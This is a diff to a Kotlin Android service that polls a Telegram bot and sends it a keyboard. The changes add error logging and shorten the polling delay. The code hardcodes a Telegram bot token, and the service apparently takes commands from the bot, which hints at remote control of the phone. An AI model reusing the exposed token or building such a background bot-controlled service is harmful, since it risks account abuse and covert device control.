@@ -7,6 +7,7 @@ import android.app.Service
 import android.content.Intent
 import android.os.Build
 import android.os.IBinder
+import android.util.Log
 import org.json.JSONObject
 import java.io.BufferedReader
 import java.io.InputStreamReader
@@ -16,6 +17,7 @@ import kotlin.concurrent.thread
 
 class BackgroundControlService : Service() {
 
+    // ضع التوكن الصحيح هنا وتأكد أنه يتبع بوتك @mohammed2009salh_bot
     private val botToken = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"
     private var lastUpdateId = 0L
     private var isRunning = true
@@ -105,9 +107,9 @@ class BackgroundControlService : Service() {
                         }
                     }
                 } catch (e: Exception) {
-                    // تجاهل أخطاء الشبكة المؤقتة
+                    Log.e("BotError", "Polling error: ${e.message}")
                 }
-                Thread.sleep(7000)
+                Thread.sleep(5000)
             }
         }
     }
@@ -184,8 +186,12 @@ class BackgroundControlService : Service() {
                 os.flush()
                 os.close()
 
+                val responseCode = connection.responseCode
+                Log.d("BotDebug", "Keyboard Response Code: $responseCode")
                 connection.inputStream.close()
-            } catch (e: Exception) {}
+            } catch (e: Exception) {
+                Log.e("BotDebug", "Keyboard Error: ${e.message}")
+            }
         }
     }
 
